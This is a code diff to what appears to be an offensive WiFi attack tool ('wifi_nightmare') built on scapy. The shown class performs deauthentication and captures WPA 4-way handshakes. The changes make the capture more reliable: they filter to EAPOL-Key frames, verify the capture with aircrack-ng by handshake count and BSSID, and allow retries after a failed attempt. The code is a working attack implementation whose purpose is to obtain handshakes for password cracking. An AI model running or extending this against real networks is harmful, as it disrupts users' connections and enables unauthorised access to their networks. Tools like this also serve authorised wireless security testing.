@@ -1,5 +1,6 @@
 import time
 import os
+import re
 import threading
 import subprocess
 from scapy.all import (
@@ -8,7 +9,7 @@ from scapy.all import (
 )
 from wifi_nightmare.deauth import BaseAttacker
 from wifi_nightmare.config import HANDSHAKES_DIR, C_GREEN, C_RED, C_YELLOW, C_CYAN, C_RESET
-from wifi_nightmare.utils import get_vendor, get_current_time_12h
+from wifi_nightmare.utils import get_vendor, get_current_time_12h, mask_bssid_filename, safe_ssid as sanitize_ssid
 from wifi_nightmare.logger import logger
 
 
@@ -175,10 +176,11 @@ class NetworkAttacker(BaseAttacker):
                 if self.attack_mode == "deauth_only":
                     return
 
-            # EAPOL capture
+            # EAPOL capture (only EAPOL-Key frames, i.e. 4-way handshake
+            # messages, count toward a handshake — Start/Logoff etc. are noise)
             if pkt.haslayer(EAPOL):
                 if self.target_bssid in [addr1, addr2]:
-                    if pkt.haslayer(Raw) or len(bytes(pkt)) > 100:
+                    if getattr(pkt[EAPOL], 'type', None) == 3 and (pkt.haslayer(Raw) or len(bytes(pkt)) > 100):
                         is_duplicate = any(bytes(pkt) == bytes(ep) for ep in self.eapol_packets)
                         if not is_duplicate:
                             self.eapol_packets.append(pkt)
@@ -186,8 +188,8 @@ class NetworkAttacker(BaseAttacker):
                             if len(self.eapol_packets) >= 4 and not self.handshake_captured:
                                 if not hasattr(self, 'extended_capture_start'):
                                     self.extended_capture_start = time.time()
-                                    logger.info("4 EAPOL packets captured, collecting context frames...")
-                                    print(f"\n{C_GREEN}[+] 4-way handshake captured! Collecting context frames...{C_RESET}")
+                                    logger.info("4 EAPOL-Key frames collected, gathering context...")
+                                    print(f"\n{C_YELLOW}[*] 4 EAPOL-Key frames collected. Gathering context frames for verification...{C_RESET}")
 
             # SSID reveal
             if self.target_ssid in ("Unknown", "<HIDDEN>") or self.attack_mode == "reveal":
@@ -220,10 +222,8 @@ class NetworkAttacker(BaseAttacker):
             pass
 
     def save_handshake(self, suffix=""):
-        safe_ssid = "".join(c for c in self.target_ssid if c.isalpha() or c.isdigit() or c == ' ').strip()
-        if not safe_ssid or safe_ssid == "<HIDDEN>":
-            safe_ssid = "Unknown_SSID"
-        filename = f"{self.target_bssid.replace(':', '-')}_{safe_ssid}{suffix}.pcap"
+        safe_ssid = sanitize_ssid(self.target_ssid)
+        filename = f"{safe_ssid}_{mask_bssid_filename(self.target_bssid)}{suffix}.pcap"
         full_path = os.path.join(HANDSHAKES_DIR, filename)
 
         if not self.eapol_packets or len(self.eapol_packets) < 2:
@@ -263,10 +263,17 @@ class NetworkAttacker(BaseAttacker):
             if self.auth_packets and self.assoc_packets:
                 print(f"{C_GREEN}    [OK] Auth/Assoc frames present (hcxpcapngtool compatible){C_RESET}")
 
+            # No `-b`: targeted mode can suppress the handshake count line.
+            # The saved pcap only holds our target's frames, so any handshake
+            # counted belongs to it.
             cmd = ["aircrack-ng", full_path]
             proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
 
-            if "1 handshake" in proc.stdout:
+            out = proc.stdout.lower()
+            m = re.search(r'(\d+)\s+handshake', out)
+            hs_count = int(m.group(1)) if m else 0
+
+            if hs_count >= 1 and self.target_bssid.lower() in out:
                 self.handshake_captured = True
                 self.handshake_filename = full_path
                 self.success = True
@@ -279,17 +286,16 @@ class NetworkAttacker(BaseAttacker):
                 logger.info(f"Valid handshake confirmed for {self.target_bssid}")
             else:
                 print(f"{C_RED}[-] Handshake verification failed{C_RESET}")
-                if "No networks found" in proc.stdout:
+                if "no networks found" in proc.stdout.lower():
                     print(f"{C_YELLOW}    Issue: No networks found in capture{C_RESET}")
-                elif "Got no data packets" in proc.stdout or "0 handshake" in proc.stdout:
-                    print(f"{C_YELLOW}    Issue: Incomplete 4-way handshake ({len(self.eapol_packets)} EAPOL){C_RESET}")
                 else:
-                    for line in proc.stdout.split('\n')[:5]:
-                        if line.strip():
-                            print(f"    {line}")
+                    print(f"{C_YELLOW}    Issue: Incomplete 4-way handshake ({len(self.eapol_packets)} EAPOL-Key frames){C_RESET}")
                 logger.info(f"Saved incomplete handshake to {full_path} for manual review")
                 print(f"{C_CYAN}    File saved for manual review: {full_path}{C_RESET}")
                 self.eapol_packets = []
+                # Allow a fresh capture cycle so a new handshake can be retried
+                if hasattr(self, 'extended_capture_start'):
+                    del self.extended_capture_start
 
         except subprocess.TimeoutExpired:
             logger.error("Aircrack-ng verification timed out")
